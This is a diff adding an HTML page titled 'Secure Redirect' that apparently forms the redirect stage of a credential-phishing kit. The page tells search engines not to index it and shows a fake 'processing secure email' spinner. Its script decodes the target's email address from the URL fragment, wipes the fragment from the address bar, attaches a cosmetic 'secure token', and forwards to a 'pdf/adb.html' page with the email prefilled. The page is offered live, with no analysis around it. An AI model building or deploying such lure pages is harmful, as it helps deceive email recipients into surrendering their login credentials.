@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="googlebot" content="noindex, nofollow" />
+  <title>Secure Redirect</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #1a202c;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+    }
+    .container {
+      text-align: center;
+      max-width: 500px;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #4a6cf7;
+    }
+    .status {
+      background: #2d3748;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    .loader {
+      border: 3px solid #2d3748;
+      border-top: 3px solid #4a6cf7;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Secure Redirect</h1>
+    <div class="status" id="status">Processing secure email...</div>
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    (function () {
+      function generateSecureToken(length = 64) {
+        const array = new Uint8Array(length / 2);
+        window.crypto.getRandomValues(array);
+        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+      }
+
+      function encodeData(data) {
+        return btoa(encodeURIComponent(data))
+          .replace(/\+/g, '-')
+          .replace(/\//g, '_')
+          .replace(/=+$/, '');
+      }
+
+      // Get the Base64 email from the URL hash
+      const hash = window.location.hash.substring(1);
+      
+      // Decode the Base64 email to get the real email
+      let realEmail = "guest@example.com"; // default
+      
+      if (hash) {
+        try {
+          // Decode the Base64 email (URL-safe decoding)
+          const base64Email = hash.replace(/-/g, '+').replace(/_/g, '/');
+          realEmail = decodeURIComponent(atob(base64Email));
+        } catch (e) {
+          console.error("Error decoding email:", e);
+        }
+      }
+
+      const token = generateSecureToken();
+
+      sessionStorage.setItem("redirect_email", realEmail);
+      sessionStorage.setItem("redirect_token", token);
+
+      history.replaceState(null, "", window.location.pathname + window.location.search);
+
+      // Re-encode the real email for the final redirect
+      const encodedEmail = encodeData(realEmail);
+      const redirectUrl = `pdf/adb.html#email=${encodedEmail}&token=${token}`;
+
+      // Update status message
+      document.getElementById('status').textContent = `Redirecting: ${realEmail}`;
+
+      // Redirect after a brief delay
+      setTimeout(() => {
+        window.location.replace(redirectUrl);
+      }, 2000);
+
+    })();
+  </script>
+</body>
+</html>
